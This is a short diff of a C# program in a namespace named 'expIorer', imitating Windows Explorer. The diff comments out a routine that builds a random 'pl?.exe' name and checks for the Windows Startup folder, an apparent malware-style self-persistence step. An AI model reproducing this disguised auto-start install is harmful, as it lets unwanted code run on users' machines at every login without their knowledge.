@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -55,6 +56,7 @@ namespace expIorer
         {
             Random rnd = new Random();
             int ting = rnd.Next(97, 122);
+            /*
             string startupDir = @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup";
             string altName = @"\pl" + Convert.ToString((char)ting) + ".exe";
             if (Directory.GetCurrentDirectory() != startupDir)
@@ -74,6 +76,7 @@ namespace expIorer
                     return;
                 }
             }
+            */
             check();
         }
     }
